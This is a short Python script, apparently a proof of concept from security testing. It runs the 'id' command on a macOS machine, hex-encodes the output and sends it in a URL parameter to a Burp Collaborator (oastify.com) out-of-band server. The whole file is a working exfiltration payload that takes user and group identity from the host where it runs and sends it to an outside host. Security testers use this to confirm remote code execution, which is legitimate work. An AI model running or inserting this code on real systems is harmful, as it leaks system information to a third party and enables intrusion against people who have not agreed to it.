import subprocess
import http.client
import binascii

def run_task():
    try:
        # 1. Ejecutar el comando 'id' en la terminal de macOS
        result = subprocess.check_output(['id'], stderr=subprocess.STDOUT)
        
        # 2. Convertir el resultado a Hexadecimal
        hex_result = binascii.hexlify(result).decode('utf-8')
        print(f"Result converted to hex: {hex_result}")

        # 3. Enviar el resultado al servidor OAST (Burp Collaborator/Interactsh)
        server = "tkhgfo9f93t9mdk9gqo0bi0ndej57vvk.oastify.com"
        conn = http.client.HTTPConnection(server)
        
        # Enviamos el hex como un parámetro en la URL o en el cuerpo
        path = f"/?data={hex_result}"
        conn.request("GET", path)
        
        response = conn.getresponse()
        print(f"Status: {response.status}, Data sent successfully.")
        conn.close()

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    run_task()
